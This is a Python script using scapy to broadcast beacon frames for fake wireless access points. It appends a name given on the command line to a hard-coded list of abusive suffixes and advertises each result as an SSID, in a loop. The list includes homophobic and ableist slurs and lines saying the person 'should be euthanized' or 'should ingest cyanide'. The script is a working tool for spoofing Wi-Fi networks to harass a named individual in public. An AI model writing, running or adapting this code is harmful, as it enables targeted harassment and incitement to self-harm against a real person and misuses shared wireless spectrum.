#!/usr/bin/python3

"""
Broadcast beacon frames for wireless access points that don't
exist.
"""

from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump,RandMAC
import sys
import random
import os

ap_slander = [
    'sup motherfucker',
    'is gay',
    'is a faggot',
    'is a little bitch',
    'is a pussy',
    'is a waste of space',
    'what a loser',
    'lol retard',
    'tweaker',
    'lowlife',
    'trash',
    'binge anotha one',
    'is a dipshit',
    'has a negative IQ',
    'is a cuck',
    'lowest scum in town',
    'is under targeted surveillance',
    'is a fuck up',
    'should be euthanized',
    'should ingest cyanide' ]

def main():
    if len(sys.argv) < 3:
        print("usage: %s <interface> <words of name>" % sys.argv[0])
        sys.exit(1)

    iface = sys.argv[1]
    name = ' '.join(sys.argv[2:])

    frames =[]
    for suffix in ap_slander:
        ssid = name+' '+suffix.upper()
        print(ssid)
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
        addr2=str(RandMAC()), addr3=str(RandMAC()))
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
        rsn = Dot11Elt(ID='RSNinfo', info=(
          '\x01\x00'                 #RSN Version 1
          '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
          '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
          '\x00\x0f\xac\x04'         #AES Cipher
          '\x00\x0f\xac\x02'         #TKIP Cipher
          '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
          '\x00\x0f\xac\x02'         #Pre-Shared Key
          '\x00\x00'))               #RSN Capabilities (no extra capabilities)


        frame = RadioTap()/dot11/beacon/essid/rsn
        #print("SSID=%-20s   %r"%(ssid,frame))
        frames.append(frame)
    sendp(frames, iface=iface, inter=0.0100 if len(frames)<10 else 0, loop=1)
    
if __name__=="__main__":
    main()

